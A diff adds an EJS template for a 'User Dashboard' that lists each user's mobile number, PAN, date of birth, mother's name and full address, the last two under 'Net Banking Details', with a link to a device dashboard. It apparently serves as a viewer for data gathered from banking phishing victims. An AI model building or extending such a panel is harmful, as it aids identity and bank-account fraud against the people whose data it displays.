@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>User Details</title>
+  <link rel="stylesheet" href="/css/userDetail.css" />
+</head>
+<body>
+  <header class="header-nav">
+    <h1>User Dashboard</h1>
+  </header>
+
+  <div class="user-detail-container">
+    
+    <!-- Personal Information -->
+    <section>
+      <h2>Personal Information</h2>
+      <% if (user && user.entries && user.entries.length) { %>
+        <% user.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Entry #<%= idx + 1 %></h3>
+            <p><strong>Mobile Number:</strong> <%= e.mobile %></p>
+            <p><strong>PAN:</strong> <%= e.pan %></p>
+            <p><strong>Date of Birth:</strong> <%= e.dob %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No personal info found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- Net Banking Details -->
+    <section>
+      <h2>Net Banking Details</h2>
+      <% if (netBanking && netBanking.entries && netBanking.entries.length) { %>
+        <% netBanking.entries.forEach((e, idx) => { %>
+          <div class="card">
+            <h3>Detail #<%= idx + 1 %></h3>
+            <p><strong>Mother's Name:</strong> <%= e.mother_name %></p>
+            <p><strong>Full Address:</strong> <%= e.full_address %></p>
+            <p><strong>Submitted:</strong> <%= new Date(e.submittedAt).toLocaleString() %></p>
+          </div>
+        <% }); %>
+      <% } else { %>
+        <div class="card"><p>No net banking data found.</p></div>
+      <% } %>
+    </section>
+
+    <!-- Back to Dashboard -->
+    <div class="actions">
+      <a href="/api/device/dashboard"><button class="dashboard-btn">Go to Dashboard</button></a>
+    </div>
+
+  </div>
+</body>
+</html>
